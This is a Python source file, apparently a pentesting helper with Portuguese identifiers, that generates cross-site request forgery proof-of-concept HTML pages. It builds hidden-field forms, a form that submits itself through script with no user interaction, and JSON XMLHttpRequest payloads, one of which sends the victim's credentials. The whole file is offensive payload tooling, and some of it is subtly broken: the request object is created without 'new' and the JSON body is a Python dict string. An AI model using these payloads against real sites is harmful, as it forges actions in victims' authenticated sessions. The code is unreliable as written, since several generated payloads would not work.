import os

# GENERATE PAYLOADS AND PARSE INFO

class CSRF():

    def __init__(self:object,action:str=0,method:str=0,name:list=0,values:list="__valor__"):
        self.__action = action
        self.__method = method
        self.__name = name
        self.__value = values
        self.__error = "Error, name and value with different numbers of arguments"

    @property
    def Error(self:object):
        return self.__error
    
    def CsrfUserInteraction(self:object):
        dicionario = {}
        for name,value in enumerate(self.__name):
            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"

        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
            "\t</form>\r\n"
            "</body>\r\n"]  

        if "csrf.html" in os.listdir():
            if "Linux" in list(os.uname()):
                os.system("rm -f csrf.html")
            elif "Windows" in list(os.uname()):
                os.system("del csrf.html")

        with open("./csrf.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "method" in tag:
                    for input in dicionario:
                        arquivo.write(dicionario[input])
                    arquivo.write("\t<input type=\"submit\">Enviar</input>\r\n")
            arquivo.write("</html>\r\n")

    def CsrfNoUserInteraction(self:object):
        dicionario = {}
        for name,value in enumerate(self.__name):
            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"

        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
            "\t</form>\r\n"
            "</body>\r\n"]

        if "csrf_nouser.html" in os.listdir():
            if "Linux" in list(os.uname()):
                os.system("rm -f csrf_nouser.html")
            elif "Windows" in list(os.uname()):
                os.system("del csrf_nouser.html")

        with open("./csrf_nouser.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "method" in tag:
                    for input in dicionario:
                        arquivo.write(dicionario[input])
                    arquivo.write("\t<script> document.forms[0].submit();</script>\r\n")
            arquivo.write("</html>\r\n")

    def CsrfJson(self:object):
        dicionario = {}
        for name,value in enumerate(self.__name):
            dicionario[self.__name[name]] = self.__value[name]
        
        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            "\t<script>\r\n",
            "\tvar csrf = XMLHttpRequest();\r\n",
            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n"
            ]

        if "csrfjson1.html" in os.listdir():
            if "Linux" in list(os.uname()):
                os.system("rm -f csrfjson1.html")
            elif "Windows" in list(os.uname()):
                os.system("del csrfjson1.html")    

        with open("./csrfjson1.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "setRequestHeader" in tag:
                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
                    arquivo.write(f"\t</script>\r\n")
                    arquivo.write(f"</body>\r\n")
                    arquivo.write(f"</html>")

    def CsrfJsonCredentials(self:object):
        dicionario = {}
        for name,value in enumerate(self.__name):
            dicionario[self.__name[name]] = self.__value[name]
        
        lista = ["<!DOCTYPE html>\r\n",
            "<html lang=\"pt-br\">\r\n",
            "<body>\r\n",
            "\t<script>\r\n",
            "\tvar csrf = XMLHttpRequest();\r\n",
            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n",
            "\tcsrf.withCredentials = true;\r\n"
            ]

        if "csrfjson2.html" in os.listdir():
            if "Linux" in list(os.uname()):
                os.system("rm -f csrfjson2.html")
            elif "Windows" in list(os.uname()):
                os.system("del csrfjson2.html")      

        with open("./csrfjson2.html","a") as arquivo:
            for tag in lista:
                arquivo.write(tag)
                if "withCredentials" in tag:
                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
                    arquivo.write(f"\t</script>\r\n")
                    arquivo.write(f"</body>\r\n")
                    arquivo.write(f"</html>")